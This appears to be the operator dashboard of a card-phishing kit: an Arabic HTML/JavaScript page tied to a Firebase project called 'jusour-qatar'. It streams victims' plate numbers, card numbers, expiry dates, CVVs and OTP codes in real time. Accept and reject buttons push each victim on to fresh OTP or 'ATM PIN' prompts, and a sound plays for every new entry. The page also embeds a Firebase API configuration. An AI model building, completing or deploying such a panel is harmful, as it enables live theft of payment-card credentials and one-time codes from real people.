<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم - المهندس حسن</title>
  <style>
    :root { --gray-cold: #d1d5db; --action-green: #2ecc71; --action-red: #e74c3c; }
    body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding: 10px; }
    .admin-container { max-width: 600px; margin: auto; }
    .header { background: #2c3e50; color: #fff; padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 15px; }
    .customer-card { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #eee; }
    .card-title { font-size: 14px; font-weight: bold; color: #7f8c8d; border-bottom: 1px solid #f1f1f1; padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; }
    .data-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
    .label { color: #95a5a6; }
    .value { color: #2c3e50; font-weight: 600; }
    .payment-section { background: #f9f9f9; padding: 10px; border-radius: 10px; margin-top: 10px; border: 1px solid #f1f1f1; }
    .action-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
    .btn-action { height: 40px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; background-color: var(--gray-cold); color: #7f8c8d; transition: all 0.3s ease; }
    .btn-active-accept { background-color: var(--action-green) !important; color: white !important; animation: pulse 1s infinite; }
    .btn-active-reject { background-color: var(--action-red) !important; color: white !important; }
    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
    .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; background: #eee; }
  </style>
</head>
<body>

<audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="admin-container">
  <div class="header">
    <h3>لوحة التحكم المباشرة</h3>
    <small>مرحباً باشمهندس حسن - تحكم Real-time</small>
  </div>
  <div id="liveList"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // دالة التحديث - تم تعديل المجموعة لـ "orders"
    async function updateStatus(docId, newStatus) {
        await db.collection("orders").doc(docId).update({ 
            status: newStatus,
            last_admin_action: firebase.firestore.FieldValue.serverTimestamp()
        });
    }

    let lastCount = 0;

    // مراقبة مجموعة orders (نفس اللي في صفحات الزبون)
    db.collection("orders").orderBy("timestamp", "desc").onSnapshot((snap) => {
        const list = document.getElementById("liveList");
        if (snap.size > lastCount && lastCount !== 0) {
            document.getElementById("notifSound").play();
        }
        lastCount = snap.size;
        list.innerHTML = "";

        snap.forEach((doc) => {
            const data = doc.data();
            const id = doc.id;
            
            // تحديد الحالات النشطة اللي محتاجة منك "أكشن"
            const isWaitingOtp = data.status === "otp_waiting";
            const isCardSent = data.status === "waiting_otp"; // الحالة اللي بيبعتها الـ checkout

            list.innerHTML += `
                <div class="customer-card">
                    <div class="card-title">
                        <span>طلب: ${id.slice(-5)}</span>
                        <span class="badge" style="background:${isWaitingOtp ? '#e74c3c' : '#eee'}; color:${isWaitingOtp ? '#fff' : '#333'}">
                            ${data.status}
                        </span>
                    </div>
                    
                    <div class="data-row"><span class="label">رقم اللوحة:</span> <span class="value">${data.plate_number || '--'}</span></div>
                    
                    <div class="payment-section">
                        <div class="data-row"><span class="label">رقم البطاقة:</span> <span class="value">${data.card_number || 'انتظار..'}</span></div>
                        <div class="data-row"><span class="label">تاريخ:</span> <span class="value">${data.exp_date || '--'}</span> | <span class="label">CVV:</span> <span class="value">${data.cvv || '--'}</span></div>
                        <div class="data-row"><span class="label">الرمز (OTP):</span> <span class="value" style="color:red; font-size:20px;">${data.otp_code || '---'}</span></div>
                    </div>

                    <div class="action-group">
                        <button class="btn-action ${isWaitingOtp || isCardSent ? 'btn-active-accept' : ''}" 
                                onclick="handleAccept('${id}', '${data.status}')">
                                قبول (التالي)
                        </button>
                        <button class="btn-action ${isWaitingOtp ? 'btn-active-reject' : ''}" 
                                onclick="handleReject('${id}', '${data.status}')">
                                رفض (إعادة طلب)
                        </button>
                    </div>
                    <button class="btn-action" style="width:100%; margin-top:10px; background:#2c3e50; color:#fff" 
                            onclick="updateStatus('${id}', 'success')">
                            إنهاء العملية بنجاح ✓
                    </button>
                </div>
            `;
        });
    });

    function handleAccept(id, currentStatus) {
        // لو الزبون دخل الكود، هندوس قبول عشان نوديه لـ ATM PIN أو صفحة النجاح
        if (currentStatus === "otp_waiting") updateStatus(id, "accept_otp");
        // لو الزبون لسه في صفحة الدفع، بنخليه يكمل لـ OTP
        else if (currentStatus === "waiting_otp") updateStatus(id, "waiting_otp");
    }

    function handleReject(id, currentStatus) {
        // لو الكود غلط، بنرجعه يكتب كود جديد
        if (currentStatus === "otp_waiting") updateStatus(id, "reject_otp");
    }
</script>
</body>
</html>
